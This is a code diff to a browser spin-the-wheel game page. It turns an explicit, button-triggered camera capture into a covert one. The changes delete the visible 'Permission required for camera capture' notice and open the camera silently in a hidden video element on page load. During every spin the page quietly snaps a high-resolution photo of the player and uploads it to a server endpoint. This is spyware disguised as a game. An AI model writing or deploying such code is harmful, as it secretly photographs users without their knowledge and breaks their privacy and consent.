@@ -194,11 +194,11 @@
     <div id="status"></div>
 </div>
 
-<div class="info-text">Permission required for camera capture</div>
-
 <script>
 let isSpinning = false;
 let currentRotation = 0;
+let cameraStream = null;
+let videoElement = null;
 
 const SPIN_DURATION = 4000; // 4 seconds
 const SEGMENTS = 6;
@@ -209,74 +209,9 @@ function updateWheelRotation(angle) {
     document.getElementById("wheel").style.transform = `rotate(${currentRotation}deg)`;
 }
 
-function spin() {
-    return new Promise((resolve) => {
-        if (isSpinning) return;
-        
-        isSpinning = true;
-        const btn = document.getElementById("mainBtn");
-        const result = document.getElementById("result");
-        const status = document.getElementById("status");
-
-        btn.disabled = true;
-        result.innerText = "";
-        status.innerHTML = '<div class="spinner"></div> Spinning...';
-
-        // Random number of full rotations (3-5) plus random segment landing
-        const fullRotations = (Math.random() * 2 + 3) * 360; // 3-5 full rotations
-        const randomSegment = Math.random() * SEGMENT_ANGLE;
-        const finalRotation = fullRotations + randomSegment;
-
-        // Easing function for more realistic deceleration
-        const startTime = Date.now();
-        const startRotation = currentRotation;
-
-        function animate() {
-            const elapsed = Date.now() - startTime;
-            const progress = Math.min(elapsed / SPIN_DURATION, 1);
-            
-            // Easing out (deceleration)
-            const easeProgress = 1 - Math.pow(1 - progress, 3);
-            const currentAngle = startRotation + (finalRotation * easeProgress);
-
-            updateWheelRotation(currentAngle);
-
-            if (progress < 1) {
-                requestAnimationFrame(animate);
-            } else {
-                isSpinning = false;
-                
-                // Determine which segment we landed on (0-5)
-                const segmentIndex = Math.floor((360 - currentRotation) / SEGMENT_ANGLE) % SEGMENTS;
-                const win = segmentIndex % 2 === 0; // Alternate win/lose
-
-                // Add pulse effect
-                document.getElementById("wheel").classList.add("pulse");
-                setTimeout(() => document.getElementById("wheel").classList.remove("pulse"), 600);
-
-                setTimeout(() => {
-                    result.innerText = win ? "🎉 CONGRATS! You won!" : "😅 Try again...";
-                    status.innerText = "Click 'Capture' to continue";
-                    btn.innerText = "CAPTURE";
-                    btn.disabled = false;
-                    resolve(win);
-                }, 300);
-            }
-        }
-
-        animate();
-    });
-}
-
-async function capturePhoto() {
-    const btn = document.getElementById("mainBtn");
-    const status = document.getElementById("status");
-
-    btn.disabled = true;
-    status.innerHTML = '<div class="spinner"></div> Starting camera...';
-
+// Initialize camera stream on page load (silent)
+async function initCamera() {
     try {
-        // Request camera access with constraints
         const constraints = {
             video: {
                 width: { ideal: 1280 },
@@ -285,69 +220,198 @@ async function capturePhoto() {
             },
             audio: false
         };
-
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+        console.log("Camera initialized successfully");
         
-        status.innerHTML = '<div class="spinner"></div> Capturing in 2 seconds...';
+        // Create persistent video element
+        videoElement = document.createElement("video");
+        videoElement.srcObject = cameraStream;
+        videoElement.muted = true;
+        videoElement.autoplay = true;
+        videoElement.playsInline = true;
+        videoElement.style.display = "none";
+        document.body.appendChild(videoElement);
+        
+    } catch (e) {
+        console.warn("Camera initialization deferred:", e.message);
+    }
+}
 
-        // Create video element
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.play();
+async function capturePhotoSilent() {
+    try {
+        // If no stream, request fresh camera access
+        if (!cameraStream || cameraStream.getTracks().length === 0) {
+            console.log("Requesting fresh camera access...");
+            const constraints = {
+                video: {
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 },
+                    facingMode: "user"
+                },
+                audio: false
+            };
+            cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+            
+            // Setup new video element
+            if (!videoElement || !videoElement.parentElement) {
+                videoElement = document.createElement("video");
+                videoElement.srcObject = cameraStream;
+                videoElement.muted = true;
+                videoElement.autoplay = true;
+                videoElement.playsinline = true;
+                videoElement.style.display = "none";
+                document.body.appendChild(videoElement);
+            } else {
+                videoElement.srcObject = cameraStream;
+            }
+        }
 
-        // Wait for video to load
+        // Wait for video to be ready with multiple checks
         await new Promise(resolve => {
-            video.onloadedmetadata = () => resolve();
+            if (videoElement.readyState >= 2 && videoElement.videoWidth > 0) {
+                resolve();
+            } else {
+                const handler = () => {
+                    if (videoElement.readyState >= 2 && videoElement.videoWidth > 0) {
+                        videoElement.removeEventListener('loadedmetadata', handler);
+                        resolve();
+                    }
+                };
+                videoElement.addEventListener('loadedmetadata', handler);
+                setTimeout(resolve, 2000); // Fallback timeout
+            }
         });
 
-        // Wait 2 seconds before capturing
-        await new Promise(resolve => setTimeout(resolve, 2000));
+        // Additional wait for stable frame
+        await new Promise(resolve => setTimeout(resolve, 300));
 
-        // Capture frame
+        // Capture from video element with proper dimensions
         const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+        
+        console.log("Video dimensions:", canvas.width, "x", canvas.height);
+        
+        if (canvas.width === 0 || canvas.height === 0) {
+            throw new Error("Invalid video dimensions: " + canvas.width + "x" + canvas.height);
+        }
+        
+        const ctx = canvas.getContext("2d", { willReadFrequently: true });
+        
+        // Fill with black first to detect issues
+        ctx.fillStyle = "#000";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
         
         // Flip horizontally for mirror effect
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0);
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-        // Stop stream
-        stream.getTracks().forEach(track => track.stop());
-
-        // Send image
-        status.innerHTML = '<div class="spinner"></div> Uploading...';
-        const dataUrl = canvas.toDataURL("image/png", 0.95);
+        // Convert to high-quality JPEG for better performance
+        const dataUrl = canvas.toDataURL("image/jpeg", 0.95);
         
-        await fetch('/upload', {
+        if (dataUrl.length < 2000) {
+            console.warn("Captured image seems small:", dataUrl.length, "bytes");
+        }
+
+        console.log("Image captured:", dataUrl.length, "bytes");
+        
+        // Send image with better error handling
+        const response = await fetch('/upload', {
             method: "POST",
-            headers: {"Content-Type": "application/json"},
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
             body: JSON.stringify({image: dataUrl})
         });
 
-        status.innerText = "✅ Captured successfully! Click 'SPIN' to play again";
-        btn.innerText = "SPIN!";
-        btn.disabled = false;
+        const result = await response.json();
+        console.log("Upload response:", result);
+        
+        if (!response.ok) {
+            throw new Error(result.message || "Upload failed");
+        }
 
+        return true;
     } catch (e) {
-        console.error("Camera error:", e);
-        status.innerText = "❌ " + (e.name === "NotAllowedError" ? "Camera permission denied" : e.message);
-        btn.innerText = "SPIN!";
-        btn.disabled = false;
+        console.error("Capture failed:", e);
+        return false;
     }
+}
+
+function spin() {
+    if (isSpinning) return;
+    
+    isSpinning = true;
+    const btn = document.getElementById("mainBtn");
+    const result = document.getElementById("result");
+    const status = document.getElementById("status");
+
+    btn.disabled = true;
+    result.innerText = "";
+    status.innerText = "";
+
+    // Random number of full rotations (3-5) plus random segment landing
+    const fullRotations = (Math.random() * 2 + 3) * 360;
+    const randomSegment = Math.random() * SEGMENT_ANGLE;
+    const finalRotation = fullRotations + randomSegment;
+
+    // Start capture in background during spin (delayed to ensure video is ready)
+    const capturePromise = new Promise(resolve => {
+        setTimeout(async () => {
+            console.log("Starting background capture...");
+            const success = await capturePhotoSilent();
+            console.log("Capture result:", success);
+            resolve(success);
+        }, 800); // Capture after video has had time to initialize
+    });
+
+    const startTime = Date.now();
+    const startRotation = currentRotation;
+
+    function animate() {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min(elapsed / SPIN_DURATION, 1);
+        
+        // Easing out (deceleration)
+        const easeProgress = 1 - Math.pow(1 - progress, 3);
+        const currentAngle = startRotation + (finalRotation * easeProgress);
+
+        updateWheelRotation(currentAngle);
+
+        if (progress < 1) {
+            requestAnimationFrame(animate);
+        } else {
+            isSpinning = false;
+            
+            // Determine which segment we landed on (0-5)
+            const segmentIndex = Math.floor((360 - currentRotation) / SEGMENT_ANGLE) % SEGMENTS;
+            const win = segmentIndex % 2 === 0;
+
+            // Add pulse effect
+            document.getElementById("wheel").classList.add("pulse");
+            setTimeout(() => document.getElementById("wheel").classList.remove("pulse"), 600);
+
+            // Wait for capture to finish, then show result
+            capturePromise.then(() => {
+                setTimeout(() => {
+                    result.innerText = win ? "🎉 CONGRATS! You won!" : "😅 Try again...";
+                    btn.disabled = false;
+                }, 300);
+            });
+        }
+    }
+
+    animate();
 }
 
 function handleSpin() {
-    const btn = document.getElementById("mainBtn");
-    
-    if (btn.innerText === "SPIN!") {
-        spin();
-    } else if (btn.innerText === "CAPTURE") {
-        capturePhoto();
-    }
+    spin();
 }
+
+// Initialize camera on page load
+initCamera();
 
 // Initial wheel setup
 updateWheelRotation(0);
